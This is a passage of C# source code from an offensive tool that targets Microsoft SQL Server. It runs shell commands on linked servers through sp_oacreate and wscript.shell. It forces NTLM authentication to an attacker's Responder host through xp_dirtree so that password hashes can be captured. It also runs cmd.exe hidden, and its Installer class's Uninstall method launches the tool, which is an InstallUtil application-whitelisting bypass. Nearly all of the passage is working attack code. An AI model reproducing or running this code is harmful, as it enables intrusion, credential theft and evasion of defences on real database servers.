                                execCmd = "EXEC('DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c \"" + usercmd + "\"'';') AT " + target + ";";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    {
                                        Console.WriteLine("Error executing command! You may be guest on this server/not have OLE object permissions!");
                                    }
                                }
                                reader.Close();
                            }
                        }
                    }
                }
                else if (hash)
                {
                    ListLinked(linkedserversarray);
                    string share = "";
                    string target = "";
                    while (true)
                    {
                        Console.Write("Enter hostname of Linked SQL server to force authentication from (self to force hash from current server): ");
                        target = Console.ReadLine();
                        if (linkedservers.Contains((target).ToUpper()))
                        {
                            break;
                        }
                        else if (target == "exit")
                        {
                            con.Close();
                            System.Environment.Exit(0);
                        }
                        else if (target == "self")
                        {
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Invalid entry.  Type exit to close application.");
                        }
                    }
                    Console.Write("Enter responder server IP: ");
                    share = Console.ReadLine();
                    if (share == "exit")
                    {
                        con.Close();
                        System.Environment.Exit(0);
                    }
                    if (target == "self")
                    {
                        Console.WriteLine("");
                        execCmd = "EXEC master..xp_dirtree \"\\\\" + share + "\\\\test\";";
                        command = new SqlCommand(execCmd, con);
                        try
                        {
                            reader = command.ExecuteReader();
                            Console.WriteLine("Successfully executed command; if you do not see hash, responder IP may be unreachable or other issues prevent authentication.");
                        }
                        catch
                        {
                            {
                                Console.WriteLine("Error forcing server auth!");
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("");
                        execCmd = "EXEC('master..xp_dirtree \"\\\\" + share + "\\\\test\";') AT " + target + ";";
                        command = new SqlCommand(execCmd, con);
                        try
                        {
                            reader = command.ExecuteReader();
                            Console.WriteLine("Successfully executed command; if you do not see hash, responder IP may be unreachable or other issues prevent authentication.");
                        }
                        catch
                        {
                            {
                                Console.WriteLine("Error forcing server auth!");
                            }
                        }
                    }
                }
                con.Close();
            }
        }
        public static int ExecuteCommand(string commnd, int timeout)
        {
            var pp = new ProcessStartInfo("cmd.exe", "/C" + commnd)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                WorkingDirectory = "C:\\",
            };
            var process = Process.Start(pp);
            process.WaitForExit(timeout);
            process.Close();
            return 0;
        }
    }
    public static class ExtensionMethods
    {
        public static string EncodeBase64(this string value)
        {
            var valueBytes = Encoding.Unicode.GetBytes(value);
            return Convert.ToBase64String(valueBytes);
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            List<string> argslist = new List<string>();
            string lParam1 = Convert.ToString(GetParam("l"));
            string lParam2 = Convert.ToString(GetParam("p"));
            string lParam3 = Convert.ToString(GetParam("d"));
            string lParam4 = Convert.ToString(GetParam("s"));
            string lParam5 = Convert.ToString(GetParam("i"));
            string lParam6 = Convert.ToString(GetParam("f"));
            string lParam7 = Convert.ToString(GetParam("x"));
            string lParam8 = Convert.ToString(GetParam("o"));
            string lParam9 = Convert.ToString(GetParam("q"));
            string lParam10 = Convert.ToString(GetParam("t"));
            string lParam11 = Convert.ToString(GetParam("h"));
            string lParam12 = Convert.ToString(GetParam("e"));
            argslist.Add(lParam1);
            argslist.Add(lParam2);
            argslist.Add(lParam3);
            argslist.Add(lParam4);
            argslist.Add(lParam5);
            argslist.Add(lParam6);
            argslist.Add(lParam7);
            argslist.Add(lParam8);
            argslist.Add(lParam9);
            argslist.Add(lParam10);
            argslist.Add(lParam11);
            argslist.Add(lParam12);

            argslist = argslist.Where(s => !string.IsNullOrWhiteSpace(s)).Distinct().ToList();
            String[] args = argslist.ToArray();

            Program.go(args);
        }

        private object GetParam(string p)
        {
            string[] inputvars = new string[] { "l", "p", "d", "s", "i" };
            try
            {
                if (this.Context != null)
                {
                    if (this.Context.Parameters[p] != null && inputvars.Contains(p))
                    {
                        string lParamValue = this.Context.Parameters[p];
                        if (lParamValue == "")
                        {
                            Console.WriteLine("You have provided a parameter that must be assigned a value: " + p);
                            System.Environment.Exit(0);
                        }
                        else if (lParamValue != null)
                            return "/" + p + ":" + lParamValue;
                    }
                    else if (this.Context.Parameters[p] != null && Array.Exists(inputvars, element => element != p))
                    {
                        string lParamValue = "/" + p;
                        return lParamValue;
                    }
                    else
                    {
                    }
                }
            }
            catch (Exception ex)
            {
            }
            return string.Empty;
        }
    }
}